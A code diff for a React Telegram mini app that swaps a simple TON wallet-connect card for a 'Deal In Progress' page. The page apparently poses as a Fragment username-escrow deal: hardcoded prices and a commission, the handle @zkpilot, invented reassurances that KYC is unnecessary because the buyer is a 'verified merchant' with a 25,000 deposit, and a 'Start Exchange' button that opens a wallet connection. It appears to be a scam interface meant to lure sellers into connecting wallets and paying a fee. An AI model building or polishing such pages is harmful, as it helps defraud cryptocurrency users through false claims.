@@ -149,17 +149,90 @@ export default function App() {
 
   return (
     <main className="page">
-      <section className="card">
-        <h1>Tsour TON Mini App (React)</h1>
-        <p>Ανοίγει το επίσημο TON Connect popup με όλα τα wallet apps.</p>
-        <button id="letsGoBtn" onClick={openTonConnect}>
-          🔗 Σύνδεση TON Wallet
+      <div className="container">
+        {/* Deal Status Badge */}
+        <div className="deal-status-badge">
+          <span className="status-text">Deal In Progress</span>
+        </div>
+
+        {/* Deal Overview */}
+        <section className="deal-overview">
+          <div className="deal-price-section">
+            <div className="price-row">
+              <span className="label">Deal Price</span>
+              <div className="price-value">
+                <span className="price-down">▼ 5000.00</span>
+                <span className="price-usd">-$7937.17</span>
+              </div>
+            </div>
+            <div className="price-row">
+              <span className="label">Commission</span>
+              <div className="price-value">
+                <span className="price-down">▼ 250.00</span>
+                <span className="price-usd">-$396.86</span>
+              </div>
+            </div>
+            <a href="#" className="how-it-works-link">How does this work?</a>
+          </div>
+        </section>
+
+        {/* Contact Information */}
+        <section className="contact-info">
+          <div className="info-row">
+            <span className="info-label">Telegram Username</span>
+            <span className="info-value">@zkpilot</span>
+          </div>
+          <div className="info-row">
+            <span className="info-label">Web Address</span>
+            <span className="info-value">t.me/zkpilot</span>
+          </div>
+          <div className="info-row">
+            <span className="info-label">TON Web 3.0 Address</span>
+            <span className="info-value">zkpilot.t.me</span>
+          </div>
+        </section>
+
+        {/* Start Exchange Button */}
+        <button className="start-exchange-btn" onClick={openTonConnect}>
+          Start Exchange
         </button>
-        <p id="status">{status}</p>
-        {wallet?.account?.address && balance && (
-          <p>Balance: {balance.tons} TON</p>
-        )}
-      </section>
+
+        {/* Subscribe Link */}
+        <a href="#" className="subscribe-link">Subscribe to updates</a>
+
+        {/* KYC Information Box */}
+        <div className="kyc-box">
+          You do not need to complete KYC verification, as the buyer is a verified merchant on a Fragment that has a security deposit of 25,000.
+        </div>
+
+        {/* Deal Status Table */}
+        <section className="deal-table">
+          <table>
+            <thead>
+              <tr>
+                <th>Deal Status</th>
+                <th>TON - Username</th>
+                <th>Recipient</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Ready</td>
+                <td>Swappable</td>
+                <td className="address-cell">UQBJuXVYsBOCE6uSBsTfySRM...</td>
+              </tr>
+            </tbody>
+          </table>
+        </section>
+
+        {/* Smart Contract Fee Details */}
+        <section className="fee-details">
+          <h3 className="fee-title">Smart contract Fee</h3>
+          <p className="fee-text">
+            Buyer and Seller pay a 5% smart contract commission from the offer amount. The commission is returned to the Seller after he confirms the offer. The commission is not returned to the buyer.
+          </p>
+        </section>
+      </div>
     </main>
   );
 }
